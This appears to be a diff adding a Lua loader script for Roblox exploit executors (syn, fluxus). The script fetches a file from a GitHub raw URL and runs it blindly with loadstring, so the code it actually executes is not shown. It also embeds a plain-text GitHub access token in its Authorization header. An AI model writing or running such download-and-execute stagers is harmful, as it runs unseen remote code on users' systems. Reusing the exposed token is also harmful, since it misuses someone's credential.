@@ -1,1 +1,28 @@
-lasty
+local github_token = "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"
+local script_url = "https://raw.githubusercontent.com/rrd11s/formeofc/refs/heads/main/main"
+
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+if request then
+    local response = request({
+        Url = script_url,
+        Method = "GET",
+        Headers = {
+            ["Authorization"] = "token " .. github_token,
+            ["Accept"] = "application/vnd.github.v3.raw"
+        }
+    })
+
+    if response and response.StatusCode == 200 then
+        local success, err = pcall(function()
+            loadstring(response.Body)()
+        end)
+        if not success then
+            warn("st1: " .. tostring(err))
+        end
+    else
+        warn("token veya repo linki hatali Kod: " .. tostring(response.StatusCode))
+    end
+else
+    warn("!")
+end
